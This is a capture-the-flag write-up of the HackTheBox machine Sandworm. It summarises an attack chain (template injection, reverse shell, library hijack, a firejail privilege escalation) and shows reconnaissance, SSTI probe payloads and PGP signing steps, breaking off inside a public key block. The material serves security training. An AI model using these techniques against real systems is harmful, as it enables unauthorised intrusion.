
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sandworm - HTB</title>
    <link rel="stylesheet" href="/styles.css">
    <link rel="stylesheet" href="/writeups.css">
    <link rel="stylesheet" href="/monokai.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="/index.html">Home</a></li>
                <li><a href="/writeups.html">WriteUPs</a></li>
                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                <li><a href="/about.html">About me</a></li>
            </ul>
        </nav>
    </header>
    <section class="writeup-content">
        <div class="container">
            <div class="writeup-panel">
                <img src="/writeups/htb/medium/sandworm/img/sandworm.png" alt="Machine Icon" class="machine-icon-circle">
                <h2>Sandworm - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links">
                    <li><a href="https://app.hackthebox.com/machines/Sandworm">HackTheBox</a></li>
                </ul>
            </div>
            <div class="writeup-content-main">
                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Sandworm</span>
<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2023</span>
</pre></div>
<h3><br/>About Sandworm</h3><br/>
Sandworm is a medium difficulty machine on HackTheBox. Firstly, we will exploit an SSTI vulnerability by abusing reflection when verifying signed PGP messages.<br/><br/>
<h3><br>Shell as atlas (on firejail)</br></h3><br>
Thanks to the SSTI, we discovered a malicious payload to execute commands as <code>atlas</code>, and by utilizing a Bash Reverse Shell, we gained access to the user.<br/><br/>
<h3><br>Shell as silentobserver</br></h3><br>
In the home directory of <code>atlas</code>, we discover credentials for the user <code>silentobserver</code> and we gain access to the user through SSH.<br/><br/>
<h3><br>Shell as atlas</br></h3><br>
There is a cron job executed by <code>atlas</code>. <code>Atlas</code> runs a Set-UID file owned by him, and we have the privileges to hijack a library used by the binary executed by <code>atlas</code>. After identifying the library, we add malicious content to execute commands as <code>atlas</code>.<br/><br/>
<h3><br>Shell as root</br></h3><br>
As <code>atlas</code>, we belong to the <code>Jailer</code> group, which has the ability to execute the Set-UID binary <code>firejail</code>. This version of <code>firejail</code> is vulnerable to <code>CVE‑2022‑31214</code>, which we exploit to gain root access.<br/><br/>
<h3><br>Recon</br></h3><br>
First, we will conduct a port scan to discover open ports on the victim machine. For this, we will use the <code>nmap</code> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.218</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.218</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">59046</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">6486</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">https</span>
</pre></div>

Understanding the open ports on the target system, our next step involves conducting a thorough scan to unveil the services and technologies operational across these ports.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">443</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span> <span class="mf">10.10.11.218</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.218</span> <span class="p">(</span><span class="mf">10.10.11.218</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.22</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>

<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>  <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssh</span>      <span class="n">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="mf">.1</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">256</span> <span class="n">b7</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">6</span><span class="n">c</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="n">c1</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">7</span><span class="n">c</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="mi">1</span><span class="n">c</span><span class="p">:</span><span class="mi">1</span><span class="n">f</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">18</span><span class="p">:</span><span class="n">cd</span><span class="p">:</span><span class="mi">9</span><span class="n">d</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="n">a8</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="n">fb</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>     <span class="n">nginx</span> <span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ssa</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">http</span> <span class="n">nginx</span> <span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">SSA</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">Secret</span> <span class="n">Spy</span> <span class="n">Agency</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">Classified</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">SA</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">04</span><span class="n">T18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">25</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2050</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">19</span><span class="n">T18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">25</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Secret</span> <span class="n">Spy</span> <span class="n">Agency</span> <span class="o">|</span> <span class="n">Secret</span> <span class="n">Security</span> <span class="n">Service</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
</pre></div>

Upon initial inspection, it becomes evident that there are two web services and an SSH service. Attempting to access the web service on port 80 triggers a redirection to HTTPS (443). Additionally, there is a domain that needs to be added to our <code>/etc/hosts</code> file to resolve the IP address of the target.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>

<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="c1"># HackTheBox</span>
<span class="mf">10.10.11.218</span> <span class="n">ssa</span><span class="o">.</span><span class="n">htb</span>
</pre></div>
<h3><br>SSL Certificate Inspection</br></h3><br>
Making use of <code>openssl</code>, we can examine the SSL certificate on port 443:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">connect</span> <span class="mf">10.10.11.218</span><span class="p">:</span><span class="mi">443</span>
</pre></div>

While there may not be immediately intriguing information, it's worth noting a potential user named <code>atlas</code>.<br/><br/>
<h3><br>Web Application</br></h3><br>
Upon accessing the website through our browser, we will see the following content:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/1.png"/><br/><br/>
Upon entering the <code>contact</code> section, we encounter information related to PGP messages:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/2.png"/><br/><br/>
A message with a hyperlink redirects us to the following page:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/4.png"/><br/><br/>
<h3><br>PGP</br></h3><br>
<em>PGP (Pretty Good Privacy) is a software program developed by Phil Zimmermann in 1991, providing public-key cryptography for secure data communication. It uses a pair of keys, public and private, for encrypting and decrypting information. PGP is commonly used for encrypting emails and files. It ensures privacy by allowing users to share their public keys for encryption and maintain the secrecy of their private keys for decryption. Additionally, PGP supports digital signatures for verifying data integrity, making it a widely adopted standard for digital communication security.</em><br/><br/>
This web application provides functionality for encrypting, decrypting, and validating the signing of PGP messages. Let's explore its features.<br/><br/>
To begin, there is a section dedicated to decrypting messages:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/5.png"/><br/><br/>
In the encrypted text field, we need to input the PGP-encrypted message. To do this, we require the PGP Public Key associated with the encryption. Let's proceed to locate the key.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/6.png"/><br/><br/>
On the same page, there is a reference to where we can obtain the public key. Clicking on the hyperlink redirects us to the <code>/pgp</code> section:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/7.png"/><br/><br/>
Here, we have the PGP Public key, and I will copy it to my clipboard.<br/><br/>
In my search for online PGP encrypters, I came across this <a href="https://8gwifi.org/pgpencdec.jsp">page</a> which allows us to encrypt any message by specifying a public key.<br/><br/>
As an example, let's encrypt the message <code>Hello World</code>.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/8.png"/><br/><br/>
Here is the encrypted <code>Hello World</code> message using the provided Public Key:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/9.png"/><br/><br/>
Once copied, let's paste it into the <code>Encrypted Text</code> field:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/10.png"/><br/><br/>
Upon clicking on <code>Decrypt Message</code>, the application returns the plaintext message:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/11.png"/><br/><br/>
Given our knowledge that this website employs Flask in the backend and considering that older versions of Flask are susceptible to Server Side Template Injection (SSTI), we can attempt some payloads to validate this potential vulnerability.<br/><br/>
Utilizing the same Public Key, I will encrypt the following payload obtained from <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks</a>:<br/><br/>
<div class="highlight"><pre><span></span><span class="err">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="err">}}</span>
<span class="err">${</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="err">}</span>
<span class="o">&lt;%=</span><span class="w"> </span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="w"> </span><span class="o">%&gt;</span>
<span class="err">${{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="err">}}</span>
<span class="o">#</span><span class="err">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="err">}</span>
<span class="o">*</span><span class="err">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="err">}</span>
</pre></div>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/13.png"/><br/><br/>
Now, let's input the PGP-encrypted message into the <code>Encrypted Text</code> field:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/14.png"/><br/><br/>
It seems that the attempt to input the SSTI PGP-encrypted message was unsuccessful. Consequently, the encryption and decryption functionality may not be exploitable at this point.<br/><br/>
<h3><br>Verifying signed messages</br></h3><br>
Verifying the signature of messages involves confirming their authenticity and integrity by checking a digital signature created with a private key against the corresponding public key. This ensures that the message hasn't been tampered with and originates from the holder of the private key.<br/><br/>
At the bottom of the page, there is an illustrative example:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/15.png"/><br/><br/>
Let's copy this message and input it into the <code>Signed Text</code> field:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/16.png"/><br/><br/>
Additionally, we require the public key associated with the message. Let's copy it from the <code>/pgp</code> section:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/17.png"/><br/><br/>
Upon clicking on <code>Verify Signature</code>, the application displays the following message:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/19.png"/><br/><br/>
Before testing the signing functionality on the page using the <code>gpg</code> tool, we need to create some keys:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
<span class="n">gpg</span> <span class="p">(</span><span class="n">GnuPG</span><span class="p">)</span> <span class="mf">2.2.40</span><span class="p">;</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">g10</span> <span class="n">Code</span> <span class="n">GmbH</span>
<span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
<span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>

<span class="n">gpg</span><span class="p">:</span> <span class="n">keybox</span> <span class="s1">'/home/elswix/.gnupg/pubring.kbx'</span> <span class="n">created</span>
<span class="n">Note</span><span class="p">:</span> <span class="n">Use</span> <span class="s2">"gpg --full-generate-key"</span> <span class="k">for</span> <span class="n">a</span> <span class="n">full</span> <span class="n">featured</span> <span class="n">key</span> <span class="n">generation</span> <span class="n">dialog</span><span class="o">.</span>

<span class="n">GnuPG</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">construct</span> <span class="n">a</span> <span class="n">user</span> <span class="n">ID</span> <span class="n">to</span> <span class="n">identify</span> <span class="n">your</span> <span class="n">key</span><span class="o">.</span>

<span class="n">Real</span> <span class="n">name</span><span class="p">:</span>
</pre></div>

First, it will prompt for a "Real name." I will specify <code>elswix</code>.<br/><br/>
Now, it's asking for an Email Address; I will specify <code>elswix@elswix.com</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">Real</span> <span class="n">name</span><span class="p">:</span> <span class="n">elswix</span>
<span class="n">Email</span> <span class="n">address</span><span class="p">:</span>
</pre></div>

The following message will be displayed, and if the information is correct, we enter the character <code>O</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">Email</span> <span class="n">address</span><span class="p">:</span> <span class="n">elswix</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span>
<span class="n">You</span> <span class="n">selected</span> <span class="n">this</span> <span class="n">USER</span><span class="o">-</span><span class="n">ID</span><span class="p">:</span>
    <span class="s2">"elswix &lt;elswix@elswix.com&gt;"</span>

<span class="n">Change</span> <span class="p">(</span><span class="n">N</span><span class="p">)</span><span class="n">ame</span><span class="p">,</span> <span class="p">(</span><span class="n">E</span><span class="p">)</span><span class="n">mail</span><span class="p">,</span> <span class="ow">or</span> <span class="p">(</span><span class="n">O</span><span class="p">)</span><span class="n">kay</span><span class="o">/</span><span class="p">(</span><span class="n">Q</span><span class="p">)</span><span class="n">uit</span><span class="err">?</span> <span class="n">O</span>
</pre></div>

After that, simply press enter a few times until the program finishes.<br/><br/>
Now, we need to sign a message. First, I will place some random content in a file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'This is a test'</span> <span class="o">&gt;</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
</pre></div>

Now, let's generate the signed message using <code>gpg</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
</pre></div>

Finally, we have the signed message:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">PGP</span> <span class="n">SIGNED</span> <span class="n">MESSAGE</span><span class="o">-----</span>
<span class="n">Hash</span><span class="p">:</span> <span class="n">SHA512</span>

<span class="n">This</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">test</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">PGP</span> <span class="n">SIGNATURE</span><span class="o">-----</span>

<span class="n">iQHGBAEBCgAwFiEEoPY4HuyVPyH</span><span class="o">/</span><span class="n">BODA730zdsfxfbcFAmVZBhMSHGVsc3dpeEBl</span>
<span class="n">bHN3aXguY29tAAoJEO99M3bH8X23xSAL</span><span class="o">/</span><span class="mi">0</span><span class="n">SiywbJ6Oj2IJZaojcQhgjW22t9z7s</span><span class="o">/</span>
<span class="n">RTkQv9IfXTwzUtK5o</span><span class="o">+</span><span class="n">xwkvbP2CyhL2DMJf6so</span><span class="o">/</span><span class="n">tP</span><span class="o">+</span><span class="n">fqbGSwn</span><span class="o">/</span><span class="n">EcIjnyvtVDCQNlU</span>
<span class="n">rdveC2f</span><span class="o">/</span><span class="mi">2</span><span class="n">M3f2Q2Uoku</span><span class="o">+</span><span class="n">N9Y</span><span class="o">/</span><span class="n">LxUPhdJ31za2L4Eizk</span><span class="o">+</span><span class="n">QP6beb6wz</span><span class="o">+</span><span class="n">JNUN5JCWyBz</span>
<span class="mi">4</span><span class="n">Kj0PChIIubaxn3G4vdwENqnwXnR</span><span class="o">/</span><span class="mi">1</span><span class="o">+</span><span class="n">OOerAzvkc</span><span class="o">/</span><span class="n">Oqns1Ou</span><span class="o">+</span><span class="n">K</span><span class="o">+</span><span class="n">yNSohd3DguoVk</span>
<span class="mi">3</span><span class="n">dB8uU8FRS4Ldhmctie29LGTbNX7umjRXuXSeZPKCydzvLDNHssOtBp8G6A1qZxk</span>
<span class="mi">02</span><span class="n">RTmo3XGtuK33Mjp2MBwVnlKrvm9PlEoBf5DPLr9i7CWAt8luCDaUmA3mBDcdfO</span>
<span class="n">TeAmUsoRnZw1ss9DkWoj312bPnti9GbvyL3Mg3RNMka7AewDXo6NJXGnij5M0fTc</span>
<span class="mi">9</span><span class="o">/</span><span class="n">Dowc0k2s7bt</span><span class="o">+</span><span class="n">YWR24JOh</span><span class="o">/</span><span class="n">iwA</span><span class="o">/</span><span class="n">GKpjsdneJ3vyrbVsFzjJIaKzXk4tU8evg5UIR</span>
<span class="n">Ip3CfIMyfc3SX069fLAhMLjjaLGk715</span><span class="o">/</span><span class="n">Tw</span><span class="o">==</span>
<span class="o">=</span><span class="n">PS98</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">PGP</span> <span class="n">SIGNATURE</span><span class="o">-----</span>
</pre></div>

Let's obtain our public key using the <code>--export</code> parameter. Remember to include the <code>--armor</code> parameter to obtain an ASCII text output:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
</pre></div>

Now, we can read the public key:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">public_key</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">PGP</span> <span class="n">PUBLIC</span> <span class="n">KEY</span> <span class="n">BLOCK</span><span class="o">-----</span>

<span class="n">mQGNBGVZBLwBDADThJmQ4flcZx2f</span><span class="o">/</span><span class="n">InsglWRRVPXkb5</span><span class="o">/</span><span class="n">s3XniH</span><span class="o">+</span><span class="n">FO69sCwV1SD9J</span>
<span class="n">H0</span><span class="o">+</span><span class="n">w2A1ZpuMIZrd7V9gNVH4im3FfpJKMewpUXyCgNKviG</span><span class="o">+</span><span class="n">N4r00YoAIpOdj3x</span><span class="o">+</span><span class="n">pU</span>
<span class="n">URmHhns7qDQGXmtjbfTAcwCF48ziIiuvkMMX</span><span class="o">/</span><span class="n">QO5bqXQUJlFEgwFQLhZnpNCb</span><span class="o">/</span><span class="n">Di</span>
<span class="mi">8</span><span class="n">UkSNKJMl3IyqjKLCQCKafMEJz3qCBrU0H1wN7wrrvIhkJsBT1TQkILnpAgHUG2K</span>
<span class="n">Fv4r2fRj6Qks1tNTzCc5SEZw7GwUgaZbndFPrMiIMtqJY9zAAFrSvNGURL5mPJdG</span>
<span class="n">N</span><span class="o">/</span><span class="n">kFib58T2yrXQrplu4IYD3z1jHBVFvBq8qOtLotof556By3RzdqG6tI90P</span><span class="o">/</span><span class="n">pqbC</span>
<span class="n">LhKpqqmeL5eMFd9ygGmjNGUgX4rW15jj7Z</span><span class="o">/</span><span class="n">Pn5lCsv6hlwr8dlNMH0FTS7unHoS4</span>
<span class="n">l0AcfyDUVd</span><span class="o">/</span><span class="n">f5Z24M6VCt</span><span class="o">++</span><span class="n">EfMasfUW15B9ZPNVwMzr23jR1</span><span class="o">/</span><span class="n">AvJf9fHHwL7j4XM</span>
<span class="n">MPLD4y8ds8EVZksAEQEAAbQaZWxzd2l4IDxlbHN3aXhAZWxzd2l4LmNvbT6JAdQE</span>
<span class="n">EwEKAD4WIQSg9jge7JU</span><span class="o">/</span><span class="n">If8E4MDvfTN2x</span><span class="o">/</span><span class="n">F9twUCZVkEvAIbAwUJA8JnAAULCQgH</span>
<span class="n">AgYVCgkICwIEFgIDAQIeAQIXgAAKCRDvfTN2x</span><span class="o">/</span><span class="n">F9twk0C</span><span class="o">/</span><span class="mi">9</span><span class="n">EIaUifvxDSgezCr0u</span>
<span class="n">lkmHl0O6l9yd</span><span class="o">/</span><span class="n">SQ3lu9UCUpqbTiTwnkskEki5s9TdBMm2JgrFrEtvXvu6P0</span><span class="o">/</span><span class="n">oTtP</span>
<span class="n">G8sdWpIfVLqumV83zW2kFySUbZqLsHGm7duUWhBCeOHYuXl8tuzlLhyM8fBA8Q3M</span>
<span class="n">S7tvYxkvb</span><span class="o">/</span><span class="n">ukdPRvPRY6PT7HlEuqpAD4pR1hLlYrEuuhZ7NgfzFpr5GImI80R8DU</span>
<span class="n">dYTUSgwDIN19lCXoTWvQp7OR1QWlEMH6JCMsI4</span><span class="o">/</span><span class="n">Zv0n4eiy3EMniFaZ3zbhdLX5n</span>
<span class="n">uiJ8SLiEHGzbV2vgKAswiijoBbJKgQ6BzCE63SlVEDs7rXyATlPmIiNaOc1mvjX3</span>
<span class="n">IkTn0ZJ1lb7eQcOWAD</span><span class="o">//</span><span class="n">OLAS</span><span class="o">/</span><span class="n">DgRcwN3n47U8qCpa0SHTa2ydXVOdp9Ma58QMJXl</span>
<span class="n">gbTlIV2OVhAby1tQYjknCWUCgOaYjWu</span><span class="o">/</span><span class="n">gPR1twTlAuKI9x</span><span class="o">+</span><span class="n">w01N3MUiouvMGgbmg</span>
<span class="n">psv1j9H28pBS3adHrJ4BS7eJoIrHXxuu0mhVSfupenrz6mS5AY0EZVkEvAEMANsz</span>
<span class="n">lMr2e72vG477WDMh4y</span><span class="o">+</span><span class="n">djw4ld8Wbg6D3XZOXgcZv3rq1e</span><span class="o">/</span><span class="mi">82</span><span class="n">WDGapTAR1HIJm1Sw</span>
<span class="n">IrjB6wEniOeGkFFAYfMjECwSvC4saUgh4VVSNFAbWIC1QjGxA8VkutYrnkYTAJIO</span>
<span class="n">K</span><span class="o">/</span><span class="mi">93</span><span class="n">oRdX5O3qr83Kl</span><span class="o">+</span><span class="n">dXIUd7PGZVjfIQQBU5F6ANskaaVhzE1ZPwAiJGFN3HwFrj</span>
<span class="n">mKZYGwYn0NqMb</span><span class="o">/</span><span class="n">owRrhPBicpEIPwYEwsFROf57ZENj35gCJlP2FIilWjv6YHgc</span><span class="o">/</span><span class="n">L</span>
<span class="n">OqOL</span><span class="o">/</span><span class="n">Pd</span><span class="o">/</span><span class="n">AGS2iht8BOFCrY</span><span class="o">++</span><span class="n">zYtZsg4gE3PS3kgHfx8NPdReXocdkN</span><span class="o">+</span><span class="n">Zx8rG</span><span class="o">/</span><span class="n">pDJ</span>
<span class="n">neF1fYkaGGL70vVS5pyWHiOgzDOhx</span><span class="o">+</span><span class="n">pzOQ5nSh1w308IDEovT9dpiqOBzoMCKjNf</span>
